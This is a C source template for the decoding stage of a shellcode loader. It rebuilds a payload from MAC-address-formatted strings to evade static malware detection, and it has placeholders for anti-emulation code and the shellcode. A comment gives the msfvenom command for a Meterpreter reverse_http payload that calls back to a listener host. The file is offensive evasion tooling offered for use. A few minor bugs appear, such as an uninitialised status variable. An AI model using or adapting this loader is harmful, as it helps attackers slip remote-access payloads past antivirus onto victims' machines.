#include <Windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

// read array of shellcode formatted as MAC addresses
// https://gitlab.com/ORCA000/hellshell/-/blob/main/MacFuscation/MacFuscation.cpp
// https://infosecwriteups.com/the-art-of-obfuscation-evading-static-malware-detection-f4663ae4716f

// compile: 
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2mac.c /link /OUT:bin2mac.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// Define our ustring struct
struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int DecodeMACFuscation(const char* MAC[], void * LpBaseAddress, int arrSize) {	
	PCSTR Terminator = NULL;
	void * LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	int i = 0;
	for (int j = 0; j < arrSize; j++) {
		LpBaseAddress2 = ((ULONG_PTR)LpBaseAddress + i);
		if (RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, LpBaseAddress2) != STATUS_SUCCESS) {
			printf("[!] RtlEthernetStringToAddressA failed for %s result %x", MAC[j], STATUS);
			return 1;
		}
		else {
			i = i + 6;
		}
	}
	return 0;
}

int main(void) {
	// Shellcode as array of MAC Addresses
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 bin2mac.py -i met.bin
	{{ANTI_EMULATION}}

	{{SHELLCODE}}
	
	// declare a variable for our shellcode size
 	unsigned int shellcode_size = (sizeof(MACs) / sizeof(MACs[0])) * 6; 
	printf("shellcode size: %d\n", shellcode_size);
	printf("size of array: %d\n", sizeof(MACs) / sizeof(MACs[0]));
	
	// Declare a buffer for storing our shellcode
	PVOID buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	
	// Decode IPs and copy into memory
	if (DecodeMACFuscation(&MACs, buffer, sizeof(MACs) / sizeof(MACs[0])) != 0) {
		return -1;
	}

	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
	
	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (shellcode_size - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}

    return 0;
}

